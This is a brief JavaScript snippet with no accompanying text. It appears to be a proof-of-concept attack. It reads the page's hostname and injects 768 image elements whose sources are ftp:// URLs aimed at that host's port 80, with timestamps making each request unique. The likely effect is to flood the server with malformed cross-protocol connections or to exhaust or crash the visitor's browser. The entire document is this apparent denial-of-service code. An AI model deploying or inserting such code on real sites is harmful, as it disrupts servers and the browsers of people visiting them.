var domain = window.location.hostname;
for( i = 0; i < 768; ++i ) {
  var img = document.createElement('img');
  img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
  document.body.appendChild(img);
}
